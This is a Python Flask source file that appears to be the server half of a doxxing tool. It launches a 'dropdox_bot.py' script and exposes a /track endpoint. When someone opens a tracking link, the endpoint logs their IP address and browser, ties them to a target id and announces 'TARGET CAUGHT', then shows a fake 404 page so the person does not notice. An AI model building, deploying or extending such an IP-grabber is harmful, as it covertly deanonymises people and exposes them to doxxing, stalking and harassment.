import os
import subprocess
import threading
from flask import Flask, request

app = Flask(__name__)

def run_bot():
    """Запуск бота в отдельном потоке"""
    print("--- [SYSTEM] Запуск бота dropdox_bot.py... ---")
    subprocess.call(["python3", "dropdox_bot.py"])

# Запускаем поток бота
threading.Thread(target=run_bot, daemon=True).start()

@app.route('/track')
def track():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    target_id = request.args.get('id', 'unknown')
    
    print(f"\n🎯 !!! TARGET CAUGHT !!!")
    print(f"🆔 ID: {target_id} | 🌐 IP: {user_ip}")
    return "<h1>404 Not Found</h1>", 404

@app.route('/')
def health_check():
    # Эта страница нужна, чтобы Railway видел: приложение ЖИВО
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
    
